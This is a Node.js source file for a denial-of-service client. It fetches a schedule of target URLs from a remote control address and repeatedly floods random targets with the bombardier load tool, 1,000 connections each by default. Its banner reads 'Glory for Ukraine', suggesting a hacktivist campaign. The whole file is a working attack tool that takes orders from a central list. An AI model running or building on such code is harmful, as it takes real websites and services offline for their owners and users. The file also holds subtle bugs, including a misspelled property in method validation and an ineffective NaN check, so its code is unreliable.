import fetch from "node-fetch";
import { spawn } from "child_process";
import path from "path";
import linq from "node-linq";
import { URL } from 'url';

const { LINQ } = linq;

let parallelFactor = 1;
let scheduledTargetsUrl = null;

let targets = [];
let targetWorkers = [];
let scheduledTargets = {};

function TargetWorker(target) {
    this.promise = null;

    const plan = processTarget(target);
    if (plan) {
        const timeout = (target.duration || 10) * 1000 * 2 * parallelFactor;
        const { process, processPromise } = plan;

        const timeoutPromise = new Promise((_, reject) => setTimeout(reject, timeout))
            .catch(() => {
                process.kill();
                throw Error("Worker timeout");
            });

        this.promise = Promise.race([processPromise, timeoutPromise]);
    } else {
        this.promise = Promise.resolve();
    }

    return this;
}

function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}

async function getScheduledTargets() {
    try {
        const res = await fetch(scheduledTargetsUrl.toString());
        const json = await res.json();
        return json;
    } catch (ex) {
        console.error("[Error] fetching scheduled targets url:", ex.message);
        return null;
    }
}

function bombardierExecutableRelativePath() {
    switch (process.platform) {
        case "win32":
            return path.join("win", "bombardier.exe");
        case "darwin":
            return path.join("mac", "bombardier");
        case "linux":
            return path.join("linux", "bombardier");
        default:
            throw Error(`Unsupported OS: ${process.platform}`);
    }
}

function bombardierExecutablePath() {
    return path.join(path.resolve(), "bin", bombardierExecutableRelativePath());
}

function processTarget(target) {
    if (target.type == "url") {
        const args = [
            ...[target.method ? `--method=${target.method.toUpperCase()}` : null].filter(Boolean),
            `--connections=${target.connections || 1000}`,
            `--duration=${target.duration || 10}s`,
            "--format=json",
            (target.url || `${target.proto || "http"}://${target.domain}${target.path}`),
        ];

        const process = spawn(bombardierExecutablePath(), args, {});
        const processPromise = new Promise((resolve, reject) => {
            let stdout = "";
            let stderr = "";

            process.stdout.on("data", (data) => {
                stdout += data.toString();
            });
            process.stderr.on("data", (data) => {
                stderr += data.toString();
            });

            process
                .on("error", (error) => {
                    reject(error);
                })
                .on("exit", () => {
                    resolve({ stdout, stderr });
                })
                .on("close", () => {
                    resolve({ stdout, stderr });
                });
        });

        return { process, processPromise };
    }

    return null;
}

async function nextTarget() {
    if (targetWorkers.length >= parallelFactor || targets.length === 0) {
        return;
    }

    const index = getRandomInt(targets.length);
    const target = targets[index];

    console.log("[Start]", target.url);

    const worker = new TargetWorker(target);

    worker.promise
        .then(
            () => console.log("[Done]", target.url),
            (error) => console.log("[Error]", target.url, ">", error.message)
        )
        .finally(() => {
            const index = targetWorkers.indexOf(worker);
            if (index !== -1) {
                targetWorkers.splice(index, 1);
            }
        });

    targetWorkers.push(worker);
}

function ToTarget(now, schedule, target) {
    if (!target) {
        console.error("target: not defined");
        return null;
    }

    if (["url"].indexOf(target.type) == -1) {
        console.error(`target: unknown target type ${target.type}`);
        return null;
    }

    if (target.method && ["get", "post", "put", "delete", "patch", "head", "options", "trage"].indexOf(target.nethod) == -1) {
        console.error(`target: unknown target method ${target.method}`);
        return null;
    }

    return {
        group: target.group || "default",
        type: target.type,
        url: target.url,
        method: target.method || "get",
    };
}

function ToTimetableRecord(now, schedule, record) {
    function MatchGroup(group) {
        return schedule.targets.Any((target) => target.group === group);
    }

    const timetableRecord = {
        start: record.start === "now" ? now : new Date(Date.parse(record.start)),
        end: record.end ? new Date(Date.parse(record.end)) : new Date(8640000000000000),
        groups: new LINQ(record.groups || []).Where(MatchGroup).ToArray(),
    };

    if (!timetableRecord.groups.length) {
        return null;
    }

    return timetableRecord;
}

async function updateScheduledTargets() {
    const now = new Date();

    function MatchCurrent(record) {
        return record.start <= now && now <= record.end;
    }

    scheduledTargets = (await getScheduledTargets() || { timetable: [], targets: [] });
    scheduledTargets.targets = new LINQ(scheduledTargets.targets).Select(ToTarget.bind(null, now, scheduledTargets)).Where(Boolean);
    scheduledTargets.timetable = new LINQ(scheduledTargets.timetable).Select(ToTimetableRecord.bind(null, now, scheduledTargets)).Where(Boolean);

    targets = scheduledTargets.timetable
        .Where(MatchCurrent)
        .SelectMany(record => record.groups)
        .SelectMany(group => scheduledTargets.targets.Where(target => target.group === group).ToArray())
        .ToArray();
}

function printGreeting() {
    console.log(`
    ██████████████████████████████
    ██████████████░░██████████████
    ████░████████░░░░████████░████
    ████░░░██████░░░░██████░░░████
    ████░█░░░█████░░██████░░█░████
    ████░██░░█████░░█████░░██░████
    ████░███░░████░░████░░███░████
    ████░███░░████░░████░░███░████
    ████░███░░████░░████░░███░████
    ████░████░░███░░███░░████░████
    ████░████░░███░░███░░████░████
    ████░██░░░███░░░░███░░░██░████
    ████░██░░███░░██░░███░░██░████
    ████░██░░░██████████░░░██░████
    ████░████░░░░░██░░░░░████░████
    ████░█████░░██░░██░░█████░████
    ████░░░░░░░░░░░░░░░░░░░░░░████
    ██████████░░██░░██░░██████████
     ██████████░░█░░█░░██████████
      ██████████░░░░░░██████████
        █████████░░░░█████████
          ██████████████████
                 ████`,
        "\n\n          Glory for Ukraine\n");
}

process
    .on("SIGINT", () => {
        process.exit();
    })
    .on("unhandledRejection", (ex) => {
        console.log(ex);
    });

(async function main() {
    printGreeting();

    if (process.env.PARALLEL_FACTOR) {
        parallelFactor = Number(process.env.PARALLEL_FACTOR);

        if (parallelFactor === NaN || parallelFactor < 1 || parallelFactor > 100) {
            console.error("Error: Envirounment variable [PARALLEL_FACTOR] not defined or not in range of [1..100].");
            process.exit(1);
        }
    }

    try {
        scheduledTargetsUrl = new URL(process.env.SCHEDULED_TARGETS_URL);
    } catch (ex) {
        console.error(`Error: Envirounment variable [SCHEDULED_TARGETS_URL] not defined or invalid. Value: [${process.env.SCHEDULED_TARGETS_URL}]`);
        process.exit(1);
    }

    console.log(`[NOTE] Started with scheduled targets store ${scheduledTargetsUrl} and parallel factor ${parallelFactor}.`);

    await updateScheduledTargets();

    setInterval(updateScheduledTargets, 10000);
    setInterval(nextTarget, 1000);
})();
